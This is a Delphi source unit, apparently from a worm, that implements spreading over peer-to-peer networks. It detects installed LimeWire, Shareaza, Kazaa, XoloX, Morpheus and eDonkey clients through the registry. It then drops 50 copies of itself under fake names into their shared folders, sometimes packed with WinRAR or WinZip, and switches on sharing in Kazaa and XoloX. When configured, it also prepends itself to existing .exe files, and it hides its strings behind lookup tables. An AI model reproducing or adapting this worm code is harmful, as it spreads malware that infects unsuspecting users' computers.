   UNIT uP2P;

   INTERFACE

   USES
     Registry, uUtils, ACLUtils, uPrepender;

   PROCEDURE InitPeerToPeer;
   FUNCTION  Packer(Binary,Password:STRING) : STRING;

   IMPLEMENTATION

   {$I Settings.ini}

   VAR
     Fake : ARRAY [1..50] OF STRING;

   {$I Resources\TSUFFIX.INI}
   {$I Resources\TP2PFILENAMES.INI}

   //------------------------------------------------------------------------------
   FUNCTION WinExecAndWait32(FileName:STRING;Visibility:Integer) : Integer;
   VAR
     Resultado   : DWORD;
     ExitCode    : DWORD;
     KK          : DWORD;
     StartupInfo : TStartupInfo;
     ProcessInfo : TProcessInformation;
     zAppName    : ARRAY [0..512] OF Char;
   BEGIN
     StrPCopy(zAppName,FileName);
     FillChar(StartupInfo,Sizeof(StartupInfo),#0);
     StartupInfo.cb:=Sizeof(StartupInfo);
     StartupInfo.dwFlags:=STARTF_USESHOWWINDOW;
     StartupInfo.wShowWindow:=Visibility;
     CreateProcess(NIL,zAppName,NIL,NIL,False,CREATE_NEW_CONSOLE OR NORMAL_PRIORITY_CLASS,NIL,NIL,StartupInfo,ProcessInfo);
     REPEAT
       ExitCode:=WaitForSingleObject(ProcessInfo.hProcess,1000);
       GetExitCodeThread(ProcessInfo.hProcess,KK);
     UNTIL (ExitCode<>WAIT_TIMEOUT);
     GetExitCodeProcess(ProcessInfo.hProcess,Resultado);
     CloseHandle(ProcessInfo.hProcess);
     Result:=Resultado;
   END;

   //------------------------------------------------------------------------------
   FUNCTION Packer(Binary,Password:STRING) : STRING;
   VAR
     ZIPPath : STRING;
     RARPath : STRING;
     ZIP     : STRING;
     O       : STRING;
     Old     : STRING;
   BEGIN
     IF Password='' THEN BEGIN
       Old:=WinPath;
       WinPath:='';
     END;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(45)+MainStr(167),False);                                  //"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\","Winzip.exe"
     ZIPPath:=Reg.ReadString('');
     Reg.CloseKey;
     Reg.OpenKey(MainStr(45)+MainStr(168),False);                                  //"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\","WinRar.exe"
     RarPath:= Reg.ReadString(MainStr(169));                                       //"Path"
     Reg.CloseKey;
     IF RarPath<>'' THEN BEGIN
       IF(RARPath[Length(RARPath)]<>'\') THEN RARPath:=RARPath+'\';
       IF FileExists(RARPath+MainStr(170)) THEN BEGIN                              //"Rar.exe"
         ZIP:=Copy(Binary,1,Pos('.',Binary))+MainStr(175);                         //"rar"
         DeleteFile(pChar(WinPath+ZIP));
         IF Password<>'' THEN O:=MainStr(171)+Password ELSE O:=MainStr(176);       //"Rar a -ep -hp","Rar a -ep"
         WinExecAndWait32(RARPath+O+' '+WinPath+ZIP+' '+WinPath+Binary,SW_HIDE);
       END;
     END ELSE IF FileExists(ZIPPath)AND(ZIPPath<>'') THEN BEGIN
       ZIP:=Copy(Binary,1,Pos('.',Binary))+MainStr(173);                           //"zip"
       DeleteFile(pChar(WinPath+ZIP));
       IF Password<>'' THEN O:=MainStr(172)+Password ELSE O:=MainStr(177);         //" -a -s"," -a"
       WinExecAndWait32(ZIPPath+O+' '+WinPath+ZIP+' '+WinPath+Binary,SW_SHOWNORMAL);
     END;
     DeleteFile(pChar(Binary));
     Result:=ZIP;
     IF Password='' THEN WinPath:=Old;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE PrependP2PDir(Path:STRING);
   VAR
     Error : Integer;
     D     : TSearchRec;
   BEGIN
     Error:=FindFirst(Path+'*'+MainStr(5),faAnyFile OR faHidden,D);                //".exe"
     WHILE Error=0 DO BEGIN
       IF D.Size<=5000000 THEN Prepend(ParamStr(0),Path+D.Name);
       Error:=FindNext(D);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE RandomFileName;
   VAR
     I      : BYTE;
     J      : BYTE;
     Double : BOOL;
     S      : STRING;
   BEGIN
     Randomize;
     I:=0;
     REPEAT
       Double:=False;
       S:=DecodeString(Random(ItemsCountInEncodedString(TFAKEFILES))+1,TFAKEFILES)+'_'+DecodeString(Random(ItemsCountInEncodedString(TADDON))+1,TADDON)+MainStr(5); //".exe"
       FOR J:=1 TO I+1 DO IF S=Fake[J] THEN Double:=True;
       IF NOT Double THEN BEGIN
         Inc(I);
         Fake[I]:=S;
       END;
     UNTIL I=50;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE MakeFakeFiles(SharedDir:STRING);
   VAR
     I : WORD;
   BEGIN
     IF DirectoryExists(SharedDir) THEN BEGIN
       Randomize;
       {$IFDEF Use_File_Prepender} PrependP2PDir(SharedDir+'\'); {$ENDIF}
       IF SharedDir<>'' THEN BEGIN
         RandomFileName;
         CreateDir(SharedDir,0);
         SetFileAttributes(pChar(SharedDir),FILE_ATTRIBUTE_HIDDEN);
         FOR I:=1 TO 50 DO BEGIN
           CopyFiles(False,SharedDir+'\'+Fake[I]);
           IF Random(3)=1 THEN Packer(SharedDir+'\'+Fake[I],'')
         END;
       END;
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION FindEDonkey : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.OpenKey(MainStr(47)+MainStr(7),False);                            //"Windows\CurrentVersion\Uninstall\eDonkey2000"
     IF Result THEN Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION EDonkeyShare : STRING;
   VAR
     I : WORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(7),False);                                    //"Windows\CurrentVersion\Uninstall\eDonkey2000"
     RESULT:=Reg.ReadString(MainStr(8));                                           //"UninstallString"
     I:=Pos(MainStr(50),RESULT);                                                   //"uninstall"
     IF I>0 THEN RESULT:=Copy(Result,2,I-2)+MainStr(9);                            //"\incoming"
     Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION FindMorpheus : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.OpenKey(MainStr(46)+MainStr(10),False);                           //"\software\","Morpheus"
     IF Result THEN Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION MorpheusShare : STRING;
   VAR
     I : WORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(11),False);                                   //"Windows\CurrentVersion\Uninstall\Morpheus 2.0"
     RESULT:=Reg.ReadString(MainStr(8));                                           //"UninstallString"
     I:=Pos(MainStr(51),RESULT);                                                   //"UNWISE.EXE"
     IF I>0 THEN RESULT:=Copy(Result,1,I-2)+MainStr(12);                           //"\My Shared Folder"
     Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION FindXoloX : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.OpenKey(MainStr(46)+MainStr(13),False);                           //"Xolox"
     IF Result THEN Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION XoloxShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr(46)+MainStr(13),False);                                   //"Xolox"
     RESULT:=Reg.ReadString(MainStr(14));                                          //"shareddirs"
     IF Pos(WinPath+MainStr(56),RESULT)=0 THEN Reg.WriteString(MainStr(14),RESULT+'|'+WinPath+MainStr(56)+'\'); //"shareddirs"
     Reg.CloseKey;
     RESULT:=WinPath+MainStr(56);
   END;

   //------------------------------------------------------------------------------
   FUNCTION FindKazaa : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.OpenKey(MainStr(46)+MainStr(15),False);                           //"Kazaa"
     IF Result THEN Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION KazaaShare : STRING;
   VAR
     Dir : STRING;
     I   : WORD;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr(46)+MainStr(16),True);                                    //"Kazaa\LocalContent"
     I:=0;
     REPEAT
       Dir:=MainStr(55)+IntToStr(I);                                               //"Dir"
       Inc(I);
       RESULT:=Reg.ReadString(Dir);
     UNTIL (RESULT='')or(Pos(MainStr(56),RESULT)>0);
     IF RESULT='' THEN Reg.WriteString(Dir,MainStr(17)+WinPath+MainStr(56));       // <- Create Dir to Fake Files   //"012345:"
     Reg.WriteInteger(MainStr(18),0);                                              // <- Enable File Sharing        //"DisableSharing"
     Reg.CloseKey;
     RESULT:=WinPath+MainStr(56);
   END;

   //------------------------------------------------------------------------------
   FUNCTION FindShareaza : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.OpenKey(MainStr(46)+MainStr(19),False);                           //"Shareaza"
     IF Result THEN Reg.CloseKey;
   END;

   FUNCTION ShareazaShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey(MainStr(46)+MainStr(20),False);                                   //"Shareaza\Shareaza\Transfers"
     RESULT:=Reg.ReadString(MainStr(21));                                          //"DownloadsPath"
     Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION FindLimeWire : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.OpenKey(MainStr(46)+MainStr(22),False);                           //"LimeWire"
     IF Result THEN Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   FUNCTION LimeWireShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(46)+MainStr(22),False);                                   //"LimeWire"
     RESULT:=Reg.ReadString(MainStr(24))+MainStr(25);                              //"InstallDir","\Shared"
     Reg.CloseKey;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InitPeerToPeer;
   BEGIN
     Reg:=TRG.Create;
     MakeFakeFiles(MainStr(26));                                                   //"C:\My Downloads"
     IF FindLimeWire THEN MakeFakeFiles(LimeWireShare);
     IF FindShareaza THEN MakeFakeFiles(ShareazaShare);
     IF FindKazaa THEN MakeFakeFiles(KazaaShare);
     IF FindXolox THEN MakeFakeFiles(XoloXShare);
     IF FindMorpheus THEN MakeFakeFiles(MorpheusShare);
     IF FindEdonkey THEN MakeFakeFiles(EdonkeyShare);
   END;

   END.
